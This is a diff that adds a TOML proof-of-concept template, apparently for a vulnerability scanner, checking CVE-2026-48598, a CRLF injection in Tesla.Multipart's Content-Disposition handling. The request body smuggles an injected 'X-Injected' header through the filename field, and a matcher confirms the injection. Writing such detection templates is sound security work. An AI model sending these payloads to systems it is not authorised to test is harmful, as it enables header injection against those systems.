@@ -1,0 +1,40 @@
+[info]
+author = "AVE"
+description = '通过向目标端点发送包含 CRLF 注入的 multipart 请求，验证 Tesla.Multipart 组件未对 Content-Disposition 参数值中的 \r、\n 和 " 字符进行转义，导致可注入额外 part 头部'
+id = "POC-AVE-2026-0299"
+name = "CVE-2026-48598 PoC"
+severity = "low"
+tags = ["ave-2026-0299"]
+vuln_id = [
+    "CVE-2026-48598",
+    "AVE-2026-0299",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/upload"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+------WebKitFormBoundary7MA4YWxkTrZu0gW\r
+Content-Disposition: form-data; name="file"; filename="test.txt\r
+X-Injected: evil\r
+"\r
+Content-Type: text/plain\r
+\r
+malicious content\r
+------WebKitFormBoundary7MA4YWxkTrZu0gW--"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["X-Injected"]
